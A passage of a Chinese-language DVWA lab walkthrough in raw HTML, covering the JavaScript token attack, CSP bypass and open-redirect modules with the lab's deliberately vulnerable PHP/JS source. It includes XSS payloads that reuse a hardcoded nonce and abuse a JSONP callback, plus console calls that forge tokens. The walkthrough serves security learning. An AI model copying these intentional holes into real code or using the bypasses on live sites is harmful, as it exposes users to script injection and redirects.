class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以看到，验证过程部分步走合在了一个阶段里了，服务器的验证逻辑时当谷歌验证返回的结果是false并且参数ecaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于（reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。</p>
<p><strong>impossible</strong><br>这个级别的代码增加了token机制防御csrf攻击，利用pdo技术防护sql注入，验证过程是一部分同时需要输入以前的密码，进一步加强了身份认证。</p>
<h2 id="DVWA-–-Javascript"><a href="#DVWA-–-Javascript" class="headerlink" title="DVWA – Javascript"></a>DVWA – Javascript</h2><p>这里的JavaScript其实指的是JavaScript Attack也就是js攻击。JavaScript是一种基于对象和事件驱动的、具有安全性的脚本语言。是一种解释型语言（代码不需要预编译）。通常JavaScript脚本是通过嵌入html中来实现自身的功能的。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function rot13(inp) &#123;</span><br><span class="hljs-string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function generate_token() &#123;</span><br><span class="hljs-string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们知道中间的一大堆使用md5生成了加密token,和之前的源码不同在于这次的token实在前端生成的，generate_token()函数的作用是获取phrase参数中的值，将其的rot13加密的结果进行md5加密作为token值</p>
<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-05-19.png" alt="尝试" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_something</span>(<span class="hljs-params">e</span>)</span>&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;&quot;</span>,n=e.length-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];<span class="hljs-keyword">return</span> t&#125;<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;do_elsesomething(<span class="hljs-string">&quot;XX&quot;</span>)&#125;,<span class="hljs-number">300</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_elsesomething</span>(<span class="hljs-params">e</span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;token&quot;</span>).value=do_something(e+<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;phrase&quot;</span>).value+<span class="hljs-string">&quot;XX&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>

<p>将phrase逆序输出，然后在前后分别添加 XX 作为规律所以当我们输入 success 的话，对应的 token 应该就是XXsseccusXX，这里也就是加密方式替换了而已。</p>
<p>漏洞复现：<br>依旧使用刚才的方法将加密方式的函数更换为do_elsesomething(“XX”);<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-14-36.png" alt="更换函数" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high.js中用了js混淆，打开<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/">逆混淆网址</a>，以调整js，获取到正确的js分析执行顺序<br>漏洞复现：<br>我们一样在控制台采用token_part_1(“ABCD”,44);和token_part_2(“XX”);<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-20-48.png" alt="成功执行" class="lazyload"></p>
<h2 id="DVWA-–-CSP-Bypass-csp绕过"><a href="#DVWA-–-CSP-Bypass-csp绕过" class="headerlink" title="DVWA – CSP Bypass(csp绕过)"></a>DVWA – CSP Bypass(csp绕过)</h2><p>csp(内容安全策略)用于定义脚本和其他资源可以从何处加载或执行，本模块根据开发人员开发时常出现的错误来绕过该策略。这些漏洞都不是csp中的实际漏洞，都是实现csp的方式中的漏洞。绕过内容安全策略并在页面执行JavaScript。</p>
<p>内容安全测略(csp)，为了缓解大部分潜在的xss问题，浏览器的扩展程序系统引入了csp，通过引入一些相当严格的策略使得扩展程序在默认情况下更安全，开发者可以创建并强制一些规则管理网站允许加载的内容。csp以白名单机制对网站加载或执行的资源起作用，在网页中策略通过http头信息或者meta元素定义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Content-Security-Policy:配置好并启用后，不符合CSP的外部资源就会被阻止加载。<br>Content-Security-Policy-Report-Only表示不执行限制选项，只是记录违反限制的行为。它必须与resport-uri选项配合使用<br></code></pre></td></tr></table></figure>

<p>CSP虽然提供了强大的安全保护，但它也使eval()及相关函数被禁用，内嵌的JavaScript代码将不会执行，只能通过白名单来加载远程脚本，如果使用csp保护网站开发者就不得不花费大量时间分离内嵌的js代码和调整。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span><br><span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span><br><span class="hljs-comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>源码定义了一个变量headerCSP放置了一些url，使用scriptsrc指令指向一个外部JavaScript文件，header()函数以原始形式将http标头发送到客户端或浏览器。也就是说源码对http头定义了csp标签从而定义了可接受的外部JavaScript资源的白名单，通过抓包可以知道是那些网站。</p>
<p><a target="_blank" rel="noopener" href="https://pastebin.com/">pastebin</a>是一个快速分享文本内容的网站，加入文本的内容是一段JavaScript代码，网页就会把改代码包含进来。<br>漏洞复现：<br>我们在pastebin写一段js代码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-11-25-21.png" alt="写js" class="lazyload"><br>然后将url注入实现攻击：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-36-17.png" alt="测试" class="lazyload"><br>但没有弹窗弹窗，查询发现<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-37-24.png" alt="错误" class="lazyload"><br>问题暂时没找到解决方法</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这个级别csp策略尝试使用nonce来防止攻击者添加内联脚本，HTTP头信息中的script-src的合法来源发生了变化。script-src还可以设置一些特殊值，unsafe-inline 允许执行页面内嵌的 script 标签和事件监听函数，nonce 值会在每次 HTTP 回应给出一个授权 token。</p>
<p>unsafe-inline：当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 不过当frame-src<br>为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js</p>
<p>nonce-source，仅允许特定的内联脚本块。如源码中：nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</p>
<p>漏洞复现：<br>现在就不是从外界导入 JavaScript 资源了，而是直接通过内联 JavaScript 代码，注入时直接令 nonce 为设定好的值即可。<br><code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-44-52.png" alt="成功" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.src = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;<br>    <span class="hljs-built_in">document</span>.body.appendChild(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-built_in">document</span>.getElementById (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.addEventListener(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        clickButton();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到后端代码除了自身源其余外部资源全部过滤，但是前端添加了一个函数solveSum函数没有对参数做任何处理。即在点击网页的按钮使js生成一个script标签，src指向source/jsonp.php?callback=solveNum。document对象使我们可以从脚本中对HTML页面中的所有元素进行访问，createElement()方法通过指定名称创建一个元素，body属性提供对&lt; body &gt;元素的直接访问，对于定义了框架集的文档将引用最外层的&lt; frameset &gt;。appendChild()方法可向节点的子节点列表的末尾添加新的子节点，也就是网页会把 “source/jsonp.php?callback=solveNum” 加入到DOM中。源码中定义了solveNum的函数函数传入参数 obj，如果字符串 “answer” 在obj 中就会执行。getElementById()方法可返回对拥有指定ID的第一个对象的引用，innerHTML属性设置或返回表格行的开始和结束标签之间的HTML。这里的script标签会把远程加载的solveSum({“answer”:”15”})当作js代码执行，然后这个函数就会在页面显示答案。</p>
<p>漏洞复现：<br>注意到需要向source/jsonp.php传入参数，这个参数没有进行任何的过滤，因此我们可以通过这个参数进行注入。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-13-58-59.png" alt="查看参数" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-29-29.png" alt="测试" class="lazyload"><br>由于是post提交我们用hackbr添加参数，我们构造参数注入<br><code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-14-34-30.png" alt="成功绕过弹出窗口" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br>header(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.src = <span class="hljs-string">&quot;source/jsonp_impossible.php&quot;</span>;<br>    <span class="hljs-built_in">document</span>.body.appendChild(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-built_in">document</span>.getElementById (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.addEventListener(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        clickButton();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>与high等级不同，impossible等级执行JSONP调用，但不使用callback参数，而是硬编码要调用的函数。CSP设置只允许本地服务器上的外部javascript，不允许内联代码。</p>
<h2 id="DVWA-–-Open-HTTP-Redirect"><a href="#DVWA-–-Open-HTTP-Redirect" class="headerlink" title="DVWA – Open HTTP Redirect"></a>DVWA – Open HTTP Redirect</h2><p>这和pikachu靶场的不安全的url重定向类似</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (array_key_exists (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    header (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br>http_response_code (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span 